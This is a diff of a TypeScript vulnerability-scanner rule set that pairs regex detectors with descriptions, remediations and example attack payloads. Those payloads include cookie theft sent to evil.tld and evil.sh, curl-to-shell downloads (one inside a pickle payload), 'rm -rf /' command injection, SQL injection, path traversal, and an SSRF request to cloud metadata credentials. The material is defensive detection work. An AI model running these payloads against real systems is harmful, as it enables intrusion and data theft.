@@ -1,9 +1,15 @@
-// CrackScope attack-simulation engine — Part 1 (heuristic rule set).
-// Scans user-submitted source code for known vulnerability patterns,
-// simulates how an attacker would try to exploit each finding, and
-// produces a pentest-style scored report. Runs fully client-side.
+// CrackScope attack-simulation engine — Part 1 (heuristic core).
+// Analyzes user-submitted source files, simulates exploitation paths for
+// each weakness class, and produces a pentest-style scored report.
+// Pure TypeScript so it runs instantly client-side; Part 3 (AST + taint
+// tracking) and Part 8 (AI deep analysis) will layer on top of this API.
 
 export type Severity = "critical" | "high" | "medium" | "low" | "info";
+
+export interface ScanInput {
+  name: string;
+  content: string;
+}
 
 export interface Finding {
   ruleId: string;
@@ -19,22 +25,24 @@ export interface Finding {
   payload: string;
 }
 
-export interface ScanFile {
-  name: string;
-  content: string;
-}
-
-export interface ScanReport {
-  name: string;
-  createdAt: number;
-  score: number;
-  grade: string;
+export interface ScanResult {
+  score: number; // 0-100
+  grade: "A" | "B" | "C" | "D" | "F";
   filesScanned: number;
   linesScanned: number;
+  languages: string[];
   counts: Record<Severity, number>;
   findings: Finding[];
-  phases: string[];
+  durationMs: number;
 }
+
+export const SEVERITY_WEIGHT: Record<Severity, number> = {
+  critical: 20,
+  high: 11,
+  medium: 5,
+  low: 2,
+  info: 0.5,
+};
 
 interface Rule {
   id: string;
@@ -44,11 +52,11 @@ interface Rule {
   owasp: string;
   description: string;
   remediation: string;
-  payload: string; // simulated attack the engine "attempts"
+  payload: string;
   pattern: RegExp;
-  // Skip lines that look like safe usage / comments / docs.
-  exclusion?: RegExp;
-  maxPerFile?: number;
+  maxMatchesPerFile?: number;
+  /** Skip lines containing any of these (naive false-positive dampening). */
+  safeHints?: string[];
 }
 
 const RULES: Rule[] = [
@@ -59,409 +67,414 @@ const RULES: Rule[] = [
     category: "Injection",
     owasp: "A03:2021 – Injection",
     description:
-      "A SQL query is assembled by concatenating or formatting strings. If any part of the string is user-controlled, an attacker can rewrite the query.",
+      "A SQL statement appears to be assembled by concatenating or interpolating variables directly into the query string. An attacker who controls those variables can break out of the query and read, modify, or destroy arbitrary database contents.",
     remediation:
-      "Use parameterized queries / prepared statements (e.g. `db.query('... WHERE id = $1', [id])`) or a query builder. Never interpolate input into SQL.",
-    payload: `' OR 1=1 -- ` sent in the interpolated field → dumps the entire table; `' UNION SELECT credit_card FROM payments -- ` exfiltrates other tables.`,
-    pattern:
-      /(?:SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM)[^;\n]{0,120}?(?:\+\s*\w+|`\s*\$\{|'\s*\+\s*|\$\{(?:req|params|query|body|input|user)\w*|%\s*\w+\s*%|\.format\s*\(|f["'])/i,
-    exclusion: /(WHERE\s+\w+\s*=\s*(\?|\$\d+|:\w+)|\$\1|--\s*safe|\btest\b.*fixture)/i,
-    maxPerFile: 8,
+      "Use parameterized queries / prepared statements for every value that reaches a query. Never build SQL with string concatenation, and validate that numeric inputs are numeric before use.",
+    payload: `Input: username = admin'--\nResulting query: SELECT * FROM users WHERE name='admin'--' AND pass='...'\nEffect: password check bypassed; trailing conditions commented out.`,
+    pattern: /\b(?:query|execute|exec|raw)\s*\(\s*[`'"][^`'"]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`'"]*[`'"]?\s*\+/i,
+    maxMatchesPerFile: 5,
+    safeHints: ["?", "prepare", "parameterized"],
   },
   {
-    id: "EXEC-001",
-    title: "Code execution through eval / exec",
-    severity: "critical",
-    category: "Code Execution",
+    id: "SQLI-002",
+    title: "SQL query with interpolated variable (f-string / template)",
+    severity: "high",
+    category: "Injection",
     owasp: "A03:2021 – Injection",
     description:
-      "`eval`/`exec` executes arbitrary strings as code. Any attacker-controlled input reaching it becomes remote code execution.",
+      "A SQL statement contains a template placeholder or format interpolation for user-controlled data. Even without concatenation, interpolated values are parsed as SQL syntax before parameter binding can happen.",
     remediation:
-      "Remove eval/exec entirely. Parse structured data with JSON.parse and dispatch logic through a lookup map instead of dynamic code evaluation.",
-    payload: `input string "process.exit(1)" or "fetch('//evil.sh/'+document.cookie)" executed verbatim in the eval context.`,
-    pattern: /\b(eval\s*\(|exec\s*\(|new\s+Function\s*\()/,
-    exclusion: /(\/\/|\/\*|\*)/,
-    maxPerFile: 6,
+      "Pass values as query parameters instead of formatting them into the SQL text (e.g. cursor.execute(sql, (value,)) or an ORM filter expression).",
+    payload: `Input: id = 1 OR 1=1\nResulting query: SELECT * FROM items WHERE id = 1 OR 1=1\nEffect: full-table enumeration instead of a single row.`,
+    pattern: /\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^;\n]*(?:\$\{|%s|%d|\+ *\w+|\w+ *\+)/,
+    maxMatchesPerFile: 5,
+    safeHints: ["prepare", "parameterized", "--"],
+  },
+  {
+    id: "XSS-001",
+    title: "Unsanitized HTML injection (XSS sink)",
+    severity: "high",
+    category: "Cross-Site Scripting",
+    owasp: "A03:2021 – Injection",
+    description:
+      "Raw HTML is rendered from a value that may include user input (innerHTML / dangerouslySetInnerHTML / document.write / v-html). Injected script executes in the victim's browser session, enabling cookie theft and request forgery.",
+    remediation:
+      "Render text content instead of HTML where possible. If HTML is required, sanitize with DOMPurify (or an equivalent allowlist sanitizer) before insertion.",
+    payload: `Input: <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)">\nEffect: session cookies exfiltrated to attacker server on page load.`,
+    pattern: /\.innerHTML\s*=|dangerouslySetInnerHTML|document\.write\s*\(|v-html/,
+    maxMatchesPerFile: 5,
+  },
+  {
+    id: "XSS-002",
+    title: "User input echoed into response without encoding",
+    severity: "medium",
+    category: "Cross-Site Scripting",
+    owasp: "A03:2021 – Injection",
+    description:
+      "A response or template appears to embed request data (query params, body, form fields) directly into markup. Reflected XSS lets an attacker craft links that run script in other users' browsers.",
+    remediation:
+      "HTML-encode all reflected values, set a strict Content-Type, and add a strong Content-Security-Policy as a second line of defense.",
+    payload: `Link: https://app.tld/search?q=<script>new Image().src='https://evil.tld?'+document.cookie</script>\nEffect: script runs for anyone who clicks the crafted link.`,
+    pattern: /res\.(?:send|write)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|json))/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "CMD-001",
-    title: "OS command injection",
+    title: "OS command injection risk (shell execution with concatenation)",
     severity: "critical",
     category: "Command Injection",
     owasp: "A03:2021 – Injection",
     description:
-      "A shell command is built from a string that includes interpolated values. An attacker who controls the interpolated part can chain arbitrary commands.",
+      "A command is executed through a shell with variables concatenated into the command string. Shell metacharacters in user input let an attacker run arbitrary commands on the host.",
     remediation:
-      "Use `execFile`/`spawn` with an argument array instead of shell string interpolation, and validate inputs against an allowlist.",
-    payload: `filename "; curl https://evil.sh/pwn | sh" → shell executes the attacker's pipeline after the intended command.`,
-    pattern:
-      /(child_process|os\.system|subprocess\.(?:call|run|Popen)|\bexec(?:Sync)?\s*\()[^;\n]{0,100}(`\s*\$\{|\$\{|'\s*\+\s*|"\s*\+\s*|%\s*\w+\s*|\.format\s*\(|\binput\b|\breq\.\w+)/i,
-    maxPerFile: 6,
+      "Avoid shelling out. If unavoidable, pass arguments as an argv array (execFile / spawn without shell:true) and never interpolate input into the command string.",
+    payload: `Input: filename = report.pdf; rm -rf /\nCommand: cat report.pdf; rm -rf /\nEffect: arbitrary command execution on the server.`,
+    pattern: /(?:exec|execSync|system|popen|shell_exec|subprocess\.(?:call|run|Popen))\s*\([^)]*(?:\+|`|\$\(|%s|f["'])/,
+    maxMatchesPerFile: 5,
+    safeHints: ["execFile", "argv"],
   },
   {
-    id: "XSS-001",
-    title: "Cross-site scripting via raw HTML injection",
-    severity: "high",
-    category: "XSS",
+    id: "CMD-002",
+    title: "eval() / dynamic code execution",
+    severity: "critical",
+    category: "Code Injection",
     owasp: "A03:2021 – Injection",
     description:
-      "Raw HTML is rendered from a dynamic string. Script or event handlers embedded in that string run in the victim's browser session.",
+      "eval()/exec()-style dynamic evaluation turns any attacker-controlled string directly into executable code. It also defeats bundler optimizations and CSP.",
     remediation:
-      "Render text nodes, not HTML. If HTML is unavoidable, sanitize with DOMPurify and forbid event handlers and javascript: URLs.",
-    payload: `<img src=x onerror="fetch('//evil.sh/?c='+document.cookie)"> stored in a comment → steals every viewer's session token.`,
-    pattern:
-      /(dangerouslySetInnerHTML|innerHTML\s*=|document\.write\s*\(|v-html)/,
-    maxPerFile: 6,
+      "Remove eval/exec. Parse structured data with JSON.parse, map strings to functions with a lookup table, or use a sandboxed expression evaluator.",
+    payload: `Input: expr = "process.exit(1)" — or worse, remote payloads\nEffect: full JavaScript/Python code execution with the app's privileges.`,
+    pattern: /\beval\s*\(|\bexec\s*\(\s*compile|\bnew Function\s*\(/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "SEC-001",
     title: "Hardcoded credential / API key",
     severity: "critical",
-    category: "Secrets",
-    owasp: "A07:2021 – Identification and Authentication Failures",
+    category: "Sensitive Data Exposure",
+    owasp: "A02:2021 – Cryptographic Failures",
     description:
-      "A secret-looking literal (key, token, password, connection string) is committed in source. Anyone with repo access — or a leaked repo — owns the credential.",
+      "A secret (password, API key, token, or private key material) is embedded in source. Anyone with repository access — or a leaked copy — gains the credential, and rotation history is lost.",
     remediation:
-      "Move all secrets to environment variables or a secrets manager, rotate the exposed credential immediately, and add the file to .gitignore.",
-    payload: `git history scraping / public repo search reveals the key → attacker calls the paid API or cloud account directly as you.`,
-    pattern:
-      /(?:api[_-]?key|apikey|secret|token|passwd|password|pwd|aws_access_key_id|private[_-]?key)\s*[:=]\s*["'][^"']{8,}["']/i,
-    exclusion: /(\{\{|process\.env|os\.environ|getenv|import\.meta\.env|placeholder|xxxxx|\bexample\b|\btest\b|\bdummy\b|\bchangeme\b|<[^>]*>|\$\{|config\[|\.env\b)/i,
-    maxPerFile: 8,
+      "Move secrets to environment variables or a secret manager, rotate the exposed credential immediately, and add the file patterns to .gitignore.",
+    payload: `Attacker action: grep -rE "api_key|password\\s*=" repo/\nEffect: valid production credential harvested from code history.`,
+    pattern: /(?:api[_-]?key|apikey|secret|password|passwd|token|auth[_-]?token)\s*[:=]\s*["'][^"'\s]{8,}["']/i,
+    maxMatchesPerFile: 8,
+    safeHints: ["process.env", "os.environ", "import.meta.env", "placeholder", "example", "your-", "xxx"],
   },
   {
-    id: "AUTH-001",
-    title: "Weak or 'none' JWT verification",
+    id: "SEC-002",
+    title: "Cloud provider key pattern detected",
     severity: "critical",
-    category: "Authentication",
-    owasp: "A07:2021 – Identification and Authentication Failures",
+    category: "Sensitive Data Exposure",
+    owasp: "A02:2021 – Cryptographic Failures",
     description:
-      "JWTs are decoded without signature verification, accepted with the `none` algorithm, or signed with a hardcoded secret. Tokens can be forged.",
+      "The text matches the structure of a well-known cloud credential (AWS access key, Google API key, Slack token, private key block). Structured keys are trivially discoverable and automated scanners index them within hours of exposure.",
     remediation:
-      "Always verify with `jwt.verify` (never `jwt.decode` for authz), pin `algorithms: ['HS256'|'RS256']`, and load the secret from the environment.",
-    payload: `attacker crafts header {"alg":"none"} with role:"admin" → forged token accepted by the API.`,
-    pattern:
-      /(jwt\.decode\s*\(|algorithms?\s*:\s*\[\s*["']none["']|verify\s*:\s*false|jwt\.sign\s*\([^)]{0,80}["'](secret|password|key)["'])/i,
-    maxPerFile: 5,
+      "Revoke and rotate the credential now, purge it from history (e.g. git filter-repo), and load it from a secret manager at runtime.",
+    payload: `Bot action: regex sweep of public repo / paste site\nEffect: key found, resources provisioned on the victim's account within minutes.`,
+    pattern: /AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|xox[baprs]-[0-9A-Za-z-]{10,}|-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "CRYPTO-001",
-    title: "Weak hashing / broken cryptography",
+    title: "Weak hash algorithm (MD5/SHA1) for security purposes",
     severity: "high",
-    category: "Cryptography",
+    category: "Cryptographic Failures",
     owasp: "A02:2021 – Cryptographic Failures",
     description:
-      "MD5 or SHA1 is used for security purposes. These are collision-broken and unsuitable for passwords or signatures.",
+      "MD5 or SHA-1 is used in a security-relevant context. Both are collision-broken; password or signature use allows forgery and fast offline cracking.",
     remediation:
-      "Use bcrypt/argon2 for passwords and SHA-256+ for integrity. For signatures use HMAC-SHA256 or better.",
-    payload: `rainbow-table lookup of the stolen MD5 digest returns the plaintext password in seconds.`,
-    pattern: /(createHash\s*\(\s*["'](md5|sha1)["']|hashlib\.(md5|sha1)\s*\(|\bMD5\s*\()/i,
-    exclusion: /(?:\/\/|\/\*)\s*(?:non-?security|checksum|etag|cache)/i,
-    maxPerFile: 5,
+      "Use SHA-256+ for integrity, and a memory-hard KDF (bcrypt, scrypt, Argon2) for passwords. For plain digests prefer SHA-3/BLAKE2.",
+    payload: `Attack: collision or 10^10/s GPU dictionary attack against stored MD5 hashes\nEffect: forged signatures / cracked password dumps.`,
+    pattern: /\b(?:md5|sha1)\s*\(|createHash\s*\(\s*["'](?:md5|sha1)["']|hashlib\.(?:md5|sha1)\s*\(/i,
+    maxMatchesPerFile: 5,
+    safeHints: ["sha256", "sha-256", "sha512"],
   },
   {
     id: "CRYPTO-002",
-    title: "Predictable randomness used for security",
+    title: "Math.random() used for security token",
     severity: "high",
-    category: "Cryptography",
+    category: "Cryptographic Failures",
     owasp: "A02:2021 – Cryptographic Failures",
     description:
-      "`Math.random()` (or Python `random`) is used for tokens, reset codes, or session IDs. Its output is predictable, so attacker can guess or reproduce values.",
-    remediation: "Use `crypto.getRandomValues` / `crypto.randomBytes` / `secrets` module for anything security-relevant.",
-    payload: `seed recovery lets the attacker predict the next reset token and take over the account.`,
-    pattern: /(Math\.random\s*\(\s*\)|\brandom\.(?:random|randint|choice)\s*\()/,
-    exclusion: /(id\b|key\b|snowflake|test|mock|stub|color|hue|render|animation|index)/i,
-    maxPerFile: 5,
+      "A token, key, or password is generated with Math.random(), which is not cryptographically secure and is predictable across a small search space once outputs are observed.",
+    remediation:
+      "Use crypto.getRandomValues / crypto.randomBytes / secrets module for any token, session id, key, or nonce.",
+    payload: `Attack: observe a few tokens, recover PRNG state, predict future session ids\nEffect: session hijacking of other users.`,
+    pattern: /(?:token|secret|password|session|key|nonce|otp|uuid|id)\s*[:=][^;\n]*Math\.random/i,
+    maxMatchesPerFile: 5,
   },
   {
     id: "CRYPTO-003",
-    title: "Insecure TLS validation disabled",
+    title: "Insecure TLS verification disabled",
     severity: "high",
-    category: "Cryptography",
+    category: "Cryptographic Failures",
     owasp: "A02:2021 – Cryptographic Failures",
     description:
-      "TLS certificate verification is switched off. Man-in-the-middle attackers can read and modify all traffic.",
+      "Certificate verification is turned off (verify=False, rejectUnauthorized:false, NODE_TLS_REJECT_UNAUTHORIZED=0). Man-in-the-middle attackers can read and modify all traffic, including credentials.",
     remediation:
-      "Remove `rejectUnauthorized: false` / `verify=False`. For internal CAs, add the CA to the trust store instead of disabling verification.",
-    payload: `attacker on the same network ARP-spoofs the gateway and intercepts credentials in plaintext.`,
-    pattern: /(rejectUnauthorized\s*:\s*false|verify\s*=\s*False|CERT_NONE|InsecureSkipVerify\s*:\s*true|check_hostname\s*=\s*False)/,
-    maxPerFile: 4,
+      "Remove the flag; install proper CA bundles instead. For self-signed dev servers, pin the specific CA rather than disabling validation.",
+    payload: `Attack: ARP-spoof / rogue Wi-Fi AP between client and server\nEffect: all requests (with bearer tokens) intercepted and altered.`,
+    pattern: /verify\s*=\s*False|rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*0|InsecureSkipVerify\s*:\s*true/i,
+    maxMatchesPerFile: 5,
+  },
+  {
+    id: "AUTH-001",
+    title: "JWT configured with 'none' algorithm or weak secret",
+    severity: "critical",
+    category: "Ident. & Auth Failures",
+    owasp: "A07:2021 – Identification and Authentication Failures",
+    description:
+      "Token verification allows the 'none' algorithm or uses a trivially guessable secret. Attackers can forge tokens claiming any identity or role.",
+    remediation:
+      "Pin the expected algorithm (e.g. HS256/RS256) at verification, use a long random secret from a secret manager, and validate iss/aud/exp claims.",
+    payload: `Crafted token: header {"alg":"none"} + payload {"role":"admin"}\nEffect: forged admin session without knowing any secret.`,
+    pattern: /jwt\.(?:verify|decode)\s*\([^)]*(?:algorithms\s*:\s*\[\s*["']none["']|ignoreExpiration\s*:\s*true)|alg\s*[:=]\s*["']none["']/i,
+    maxMatchesPerFile: 5,
+  },
+  {
+    id: "AUTH-002",
+    title: "Authorization check missing on sensitive route",
+    severity: "high",
+    category: "Ident. & Auth Failures",
+    owasp: "A01:2021 – Broken Access Control",
+    description:
+      "A data-mutating route resolves records straight from request parameters with no visible ownership or role check — the classic IDOR pattern: change the id, read someone else's data.",
+    remediation:
+      "Scope every query by the authenticated principal (e.g. where({ id, userId }) ) and enforce role checks in middleware, not just in the UI.",
+    payload: `Request: GET /api/invoices/4711 with another tenant's id\nEffect: cross-tenant data read; iterate ids for mass exfiltration.`,
+    pattern: /(?:app|router)\.(?:get|post|put|patch|delete)\s*\([^)]*\)\s*,?[^{]*\{[^}]*(?:req\.(?:params|body)\.id|params\.id)\b(?![^}]*userId)(?![^}]*owner)/,
+    maxMatchesPerFile: 4,
   },
   {
     id: "PATH-001",
-    title: "Path traversal in file access",
+    title: "Path traversal risk in file access",
     severity: "high",
     category: "Path Traversal",
     owasp: "A01:2021 – Broken Access Control",
     description:
-      "A filesystem path is built from a request-controlled value without normalization, allowing `../` escapes outside the intended directory.",
+      "A filesystem path is built from request data without normalization or containment checks. `../` sequences escape the intended directory to read or write arbitrary files.",
     remediation:
-      "Resolve the final path and assert it starts with the intended base directory; reject inputs containing `..`, or serve by allowlisted ID instead of filename.",
-    payload: `GET /download?file=../../../../etc/passwd → server returns the password file.`,
-    pattern:
-      /((?:readFile|writeFile|createReadStream|open|unlink|sendFile|fs\.)\s*\(\s*[^)\n]{0,80}(\+\s*\w+|`\s*\$\{|\$\{\s*(?:req|params|query|body|file|path))|send_file\s*\([^)\n]{0,60}\+)/i,
-    maxPerFile: 5,
+      "Normalize with path.resolve and verify the result stays inside the allowed base directory; reject absolute paths and `..` segments; prefer allowlisted ids mapped to paths.",
+    payload: `Input: file = ../../../../etc/passwd  (or ..\\..\\..\\windows\\win.ini)\nEffect: arbitrary file read outside the intended folder.`,
+    pattern: /(?:readFile|createReadStream|sendFile|open|unlink|fs\.(?:read|write))\s*\([^)]*(?:\+\s*(?:req|request|params|query)|\.\.\b)/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "SSRF-001",
-    title: "Server-side request from user-controlled URL",
+    title: "Server-side request built from user-controlled URL (SSRF)",
     severity: "high",
     category: "SSRF",
     owasp: "A10:2021 – Server-Side Request Forgery",
     description:
-      "The server fetches a URL built from input without validation. Attackers pivot to internal services (cloud metadata, admin panels) from the server's network position.",
+      "An outbound HTTP request uses a URL derived from request input. Attackers pivot the server into the internal network: cloud metadata endpoints, admin panels, and internal services.",
     remediation:
-      "Allowlist destination hosts/schemes, resolve DNS and block private ranges (169.254.169.254, 10/8, 127/8), and never follow redirects blindly.",
-    payload: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ → cloud credentials returned to the attacker.`,
-    pattern:
-      /((?:axios|fetch|requests\.get|requests\.post|urllib\.request\.urlopen|http\.Get|curl_init)\s*\(\s*[^)\n]{0,80}(\+\s*\w+|`\s*\$\{|\$\{|input|url\b))/i,
-    exclusion: /(https?:\/\/(?:api\.|fonts\.|cdn\.|unpkg\.com|registry\.npmjs))/i,
-    maxPerFile: 5,
+      "Allowlist target hosts/schemes, resolve DNS and block private/link-local ranges, disable redirects, and never let raw user input choose the destination.",
+    payload: `Input: url = http://169.254.169.254/latest/meta-data/iam/security-credentials/\nEffect: cloud instance role credentials returned to the attacker.`,
+    pattern: /(?:fetch|axios(?:\.(?:get|post))?|requests\.get|urllib\.request\.urlopen|http\.Get)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|json)|url\s*\+)/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "DESER-001",
-    title: "Insecure deserialization",
+    title: "Unsafe deserialization of untrusted data",
     severity: "critical",
-    category: "Deserialization",
+    category: "Insecure Deserialization",
     owasp: "A08:2021 – Software and Data Integrity Failures",
     description:
-      "Untrusted serialized objects are deserialized directly. Crafted payloads instantiate arbitrary classes/gadgets → remote code execution.",
+      "Untrusted data is deserialized with a format that can reconstruct arbitrary objects (pickle, yaml.load without Loader, unserialize, eval of JSON). Deserialization gadget chains lead to remote code execution.",
     remediation:
-      "Never deserialize untrusted data with pickle/yaml.load/unserialize. Use JSON, and set yaml.safe_load; validate against a schema.",
-    payload: `pickle payload !!python/object/apply:os.system ["curl evil.sh | sh"] → RCE on the server.`,
-    pattern: /(pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*Loader\s*=)|unserialize\s*\(|ObjectInputStream|readObject\s*\(\s*\))/,
-    maxPerFile: 4,
-  },
-  {
-    id: "CORS-001",
-    title: "Wildcard CORS policy",
-    severity: "medium",
-    category: "Configuration",
-    owasp: "A05:2021 – Security Misconfiguration",
-    description:
-      "Access-Control-Allow-Origin is `*` (or reflected from the Origin header), letting any website read authenticated responses from the victim's browser.",
-    remediation:
-      "Allowlist exact origins. If credentials are involved, `*` is never acceptable.",
-    payload: `malicious page fires fetch('https://api.victim.com/me') with the user's cookie → response readable cross-origin.`,
-    pattern: /(Access-Control-Allow-Origin["']?\s*[,:=]\s*["']\*["']|origin\s*:\s*["']\*["']|cors\s*\(\s*\{\s*origin\s*:\s*["']\*["'])/i,
-    maxPerFile: 3,
+      "Use safe data-only formats: JSON, or yaml.safe_load. Never unpickle/unserialize data that crosses a trust boundary; validate against a schema first.",
+    payload: `Payload: crafted pickle/yaml object with __reduce__ / !python/object applying os.system\nEffect: RCE the moment the object is deserialized.`,
+    pattern: /pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*Loader)|\bunserialize\s*\(|nodeSerializable|ObjectInputStream/,
+    maxMatchesPerFile: 5,
   },
   {
     id: "CONFIG-001",
-    title: "Debug / verbose mode enabled in production code",
+    title: "Permissive CORS policy (wildcard origin)",
     severity: "medium",
-    category: "Configuration",
+    category: "Security Misconfiguration",
     owasp: "A05:2021 – Security Misconfiguration",
     description:
-      "Debug mode exposes stack traces, configuration, and environment details that attackers use for reconnaissance.",
-    remediation: "Disable debug in production; route detailed errors to logs and show generic error pages to users.",
-    payload: `triggering an error page leaks framework version, file paths and config values, shortening the attacker's recon phase.`,
-    pattern: /(DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True|DEBUG\s*:\s*true)/,
-    exclusion: /(process\.env|NODE_ENV|development)/i,
-    maxPerFile: 3,
+      "CORS allows any origin (or reflects it blindly). Any website a victim visits can read authenticated API responses cross-origin.",
+    remediation:
+      "Echo back only allowlisted origins, and enable credentials only for those specific origins.",
+    payload: `Attack page: fetch('https://app.tld/api/me', {credentials:'include'}) from evil.tld\nEffect: victim's private API data read by the attacker's page.`,
+    pattern: /Access-Control-Allow-Origin["'\s:]+\*|cors\s*\(\s*\{\s*origin\s*:\s*["']\*["']/,
+    maxMatchesPerFile: 4,
+  },
+  {
+    id: "CONFIG-002",
+    title: "Debug / development mode exposed in production config",
+    severity: "medium",
+    category: "Security Misconfiguration",
+    owasp: "A05:2021 – Security Misconfiguration",
+    description:
+      "Debug mode or verbose error output is enabled in what looks like application configuration. Stack traces and interactive consoles leak source code, settings, and sometimes a live debugger.",
+    remediation:
+      "Gate debug flags on the environment, disable Werkzeug/debug consoles in production, and return generic error pages with details logged server-side only.",
+    payload: `Trigger: force an unhandled exception (malformed payload)\nEffect: stack trace reveals file paths, library versions, and config values.`,
+    pattern: /DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True|debug\s*:\s*true(?![^\n]*(?:NODE_ENV|production))/,
+    maxMatchesPerFile: 4,
+  },
+  {
+    id: "REDIR-001",
+    title: "Open redirect via unvalidated redirect target",
+    severity: "medium",
+    category: "Broken Access Control",
+    owasp: "A01:2021 – Broken Access Control",
+    description:
+      "A redirect target is taken from request input without validation. Phishers abuse the trusted domain to bounce victims to malicious sites, and it can amplify OAuth token leaks.",
+    remediation:
+      "Validate redirect targets against an allowlist of relative paths or trusted hosts; default to a known-safe location when the input fails validation.",
+    payload: `Link: https://app.tld/login?next=https://evil-phish.tld/clone\nEffect: victim is redirected to a convincing phishing clone on a trusted referral.`,
+    pattern: /(?:redirect|redirectTo|res\.redirect)\s*\(\s*(?:req\.(?:query|body|params)|request\.(?:query|url))/,
+    maxMatchesPerFile: 4,
   },
   {
     id: "PROTO-001",
-    title: "Prototype pollution risk in deep merge",
-    severity: "high",
-    category: "Code Execution",
-    owasp: "A08:2021 – Software and Data Integrity Failures",
-    description:
-      "Recursive merge of user input into objects without guarding `__proto__`/`constructor` lets attackers rewrite prototype properties application-wide.",
-    remediation:
-      "Guard against `__proto__`, `prototype`, and `constructor` keys, or use a battle-tested merge library with built-in protection.",
-    payload: `JSON body {"__proto__":{"isAdmin":true}} → every new object inherits isAdmin, bypassing authorization checks.`,
-    pattern: /(deepMerge|mergeDeep|deepmerge|Object\.assign\s*\(\s*\w+,\s*(?:req|input|body))|__proto__/,
-    maxPerFile: 4,
-  },
-  {
-    id: "CRYPTO-004",
-    title: "Hardcoded IV / static salt",
+    title: "Deep merge of user input (prototype pollution)",
     severity: "medium",
-    category: "Cryptography",
-    owasp: "A02:2021 – Cryptographic Failures",
-    description:
-      "A fixed initialization vector or salt is reused across encryptions, collapsing ciphertext uniqueness and enabling pattern recovery.",
-    remediation: "Generate a fresh random IV per message (`crypto.randomBytes(16)`) and unique salts per user; store them alongside ciphertext.",
-    payload: `two ciphertexts XORed reveal plaintext relations because the IV repeats.`,
-    pattern: /(createCipheriv\s*\([^)]{0,60}(?:iv|IV)\s*["'][^"']+["']|salt\s*[:=]\s*["'][^"']+["'])/i,
-    exclusion: /(process\.env|randomBytes|getRandomValues|import)/i,
-    maxPerFile: 4,
-  },
-  {
-    id: "XSS-002",
-    title: "Reflected user input written into response",
-    severity: "medium",
-    category: "XSS",
+    category: "Prototype Pollution",
     owasp: "A03:2021 – Injection",
     description:
-      "Request parameters are echoed into a response/template without escaping — a classic reflected XSS vector.",
-    remediation: "Auto-escape template engines (enable `escape`), and never concatenate user input into HTML strings.",
-    payload: `?q=<script>fetch('//evil.sh/?c='+document.cookie)</script> reflected and executed in the victim's browser.`,
-    pattern: /(res\.(?:send|write)\s*\(\s*["'`][^"'`]{0,60}\+\s*req\.|render_template_string\s*\(|echo\s+\$_(?:GET|POST|REQUEST))|res\.send\s*\(\s*req\./,
-    maxPerFile: 5,
-  },
-  {
-    id: "AUTH-002",
-    title: "Password stored in plaintext",
-    severity: "critical",
-    category: "Authentication",
-    owasp: "A07:2021 – Identification and Authentication Failures",
-    description:
-      "Passwords are saved directly to the database without a slow adaptive hash. A single DB leak exposes every user's credential.",
-    remediation: "Hash with bcrypt/argon2 (unique salt per user, cost ≥ 12) before storage; enforce minimum entropy on signup.",
-    payload: `SQL injection or backup leak dumps the users table → every password is immediately readable.`,
-    pattern: /((?:insert|create|save|add)[^;\n]{0,60}password|password\s*[:=]\s*(?:req\.\w+|user\.\w+|input))/i,
-    exclusion: /(bcrypt|argon|hash|hashSync|digest|pbkdf2|scrypt|compare)/i,
-    maxPerFile: 4,
-  },
-  {
-    id: "CONF-002",
-    title: "Secrets committed in config / env-style file",
-    severity: "high",
-    category: "Secrets",
-    owasp: "A05:2021 – Security Misconfiguration",
-    description:
-      "A configuration file contains concrete credential values rather than placeholders — this file often ships with builds or repos.",
-    remediation: "Keep real values only in the deployment secret store; commit `.example` files with placeholders instead.",
-    payload: `dotfile scanning bots find .env committed to the repo and exfiltrate every service credential.`,
-    pattern: /^\s*[A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD)[A-Z0-9_]*\s*=\s*["']?[A-Za-z0-9+/=_-]{10,}["']?\s*$/m,
-    exclusion: /(\$\{|process\.env|example|placeholder|your[_-]?key|xxx|changeme|<)/i,
-    maxPerFile: 6,
+      "User-controlled objects are merged without filtering __proto__, constructor, or prototype keys. Polluting Object.prototype can flip security-relevant defaults or escalate into RCE in some frameworks.",
+    remediation:
+      "Block __proto__/constructor/prototype keys in recursive merges, or use structuredClone / Object.create(null) based merging.",
+    payload: `JSON body: {"__proto__":{"isAdmin":true}}\nEffect: every new object inherits isAdmin=true; auth checks keyed on defaults fail open.`,
+    pattern: /(?:merge|deepMerge|extend|defaultsDeep)\s*\([^)]*(?:req\.body|request\.json|userInput)/,
+    maxMatchesPerFile: 4,
   },
 ];
 
-const SEVERITY_WEIGHT: Record<Severity, number> = {
-  critical: 22,
-  high: 12,
-  medium: 6,
-  low: 2,
-  info: 0,
-};
-
-export const SEVERITY_ORDER: Severity[] = ["critical", "high", "medium", "low", "info"];
-
-function gradeFor(score: number): string {
-  if (score >= 90) return "A";
-  if (score >= 75) return "B";
-  if (score >= 60) return "C";
-  if (score >= 40) return "D";
-  return "F";
+function extToLanguage(name: string): string {
+  const ext = name.split(".").pop()?.toLowerCase() ?? "";
+  const map: Record<string, string> = {
+    ts: "TypeScript", tsx: "TypeScript", js: "JavaScript", jsx: "JavaScript",
+    mjs: "JavaScript", cjs: "JavaScript", py: "Python", rb: "Ruby",
+    go: "Go", java: "Java", php: "PHP", cs: "C#", cpp: "C++", c: "C",
+    rs: "Rust", sql: "SQL", yml: "YAML", yaml: "YAML", json: "JSON",
+    env: "Config", sh: "Shell", html: "HTML", vue: "Vue", svelte: "Svelte",
+  };
+  return map[ext] ?? "Unknown";
 }
 
-export const EMPTY_COUNTS: Record<Severity, number> = {
-  critical: 0,
-  high: 0,
-  medium: 0,
-  low: 0,
-  info: 0,
